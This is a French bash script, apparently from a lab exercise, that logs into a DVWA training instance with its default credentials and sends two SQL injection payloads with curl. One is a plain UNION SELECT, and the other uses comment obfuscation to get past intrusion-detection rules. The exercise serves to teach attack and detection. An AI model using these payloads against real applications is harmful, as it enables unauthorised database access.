#!/bin/bash
# =============================================================================
#  payloads.sh — Equipe 4 — Round 1 (Injection SQL)
#
#  Usage (apres avoir deploye les regles adverses) :
#    bash attacks/equipe-4/payloads.sh <ip_dvwa>
#
#  Par defaut cible : dvwa (nom Docker)
# =============================================================================

TARGET="${1:-dvwa}"
PORT="80"
COOKIE_FILE="/tmp/dvwa_eq4.txt"

echo "=== Equipe 4 — Attaques R1 (Injection SQL) ==="
echo "Cible : $TARGET:$PORT"
echo ""

# Authentification DVWA
curl -s -c "$COOKIE_FILE" \
  -d "username=admin&password=password&Login=Login" \
  "http://$TARGET:$PORT/login.php" -L -o /dev/null
echo "[*] Cookie recupere"
echo ""

# ── Payload 1 — REMPLACEZ PAR VOTRE ATTAQUE ────────────────────────────────
# echo "[1] Payload basique..."
curl  "http://172.20.0.10/vulnerabilities/sqli/?id=1+UNION+SELECT+1,2--&Submit=Submit"


# ── Payload 2 ───────────────────────────────────────────────────────────────
curl "http://172.20.0.10/vulnerabilities/sqli/?id=1+UN%2F**%2FION+SEL%2F**%2FECT+1,2--&Submit=Submit" | grep -i "first name"

# ── Payload 3 ───────────────────────────────────────────────────────────────


echo ""
echo "=== Fin des attaques. Verifiez fast.log pour les alertes. ==="
